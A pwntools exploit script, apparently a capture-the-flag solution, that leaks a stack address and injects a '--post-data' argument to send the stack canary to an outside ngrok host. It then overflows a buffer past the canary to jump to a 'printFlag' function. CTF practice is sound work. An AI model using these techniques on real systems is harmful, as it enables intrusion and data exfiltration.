from pwn import *

conn=remote("localhost", 4444)
#conn=process("../src/chall")
elf=ELF("../src/chall")

conn.recvuntil(b">")
conn.sendline(b"3")
conn.sendline(b"")
conn.sendline(b"")
conn.recvuntil(b">")
conn.sendline(b"1")
conn.sendline(b"a")
conn.recvuntil(b"Action ")
leak=int(conn.recvuntil(b' ').decode())

print(hex(leak))

canary_address=leak-320+1

print(hex(canary_address))

conn.sendline(b"5")
conn.recvuntil(b">")
conn.sendline(b"4")
conn.sendline(b"--post-data\x00")
conn.sendline(b"2")
payload=b"http://5.tcp.eu.ngrok.io:15257"
payload += b"\x00" * (130-len(payload))
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(elf.symbols['name'])
payload += p64(canary_address)
payload += p64(0)
#gdb.attach(conn)
conn.sendline(payload)

canary=int(input("canary? ")[2:], 16)
print(hex(canary))
conn.recvuntil(b">")
conn.sendline(b"2")
payload=b"http://www.google.com"
payload += b"\x00"* (130-len(payload))
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)

payload += p64(canary)
payload += p64(0)
payload += p64(0x000000000040101a) # ret gadget
payload += p64(elf.symbols['printFlag'])
#gdb.attach(conn)
conn.sendline(payload)
conn.interactive()
